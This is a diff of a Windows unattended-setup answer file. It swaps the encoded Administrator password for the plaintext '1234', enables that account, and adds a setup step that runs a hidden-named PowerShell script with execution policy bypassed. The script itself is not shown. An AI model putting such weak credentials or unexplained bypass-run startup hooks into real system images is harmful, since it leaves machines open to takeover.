@@ -32,8 +32,8 @@
 			</OOBE>
 			<UserAccounts>
 				<AdministratorPassword>
-					<PlainText>false</PlainText>
-					<Value>MQAyADMANABBAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByAFAAYQBzAHMAdwBvAHIAZAA=</Value>
+					<PlainText>true</PlainText>
+					<Value>1234</Value>
 				</AdministratorPassword>
 				<LocalAccounts>
 					<LocalAccount wcm:action="add">
@@ -63,7 +63,10 @@
 				<RunSynchronousCommand wcm:action="add">
 					<Order>1</Order>
 					<Path>net user Administrator /active:Yes</Path>
-					<WillReboot>Never</WillReboot>
+				</RunSynchronousCommand>
+				<RunSynchronousCommand wcm:action="add">
+					<Order>2</Order>
+					<Path>powershell -ep bypass -f C:\Temp\Helper\.Autorun.ps1 system</Path>
 				</RunSynchronousCommand>
 			</RunSynchronous>
 		</component>
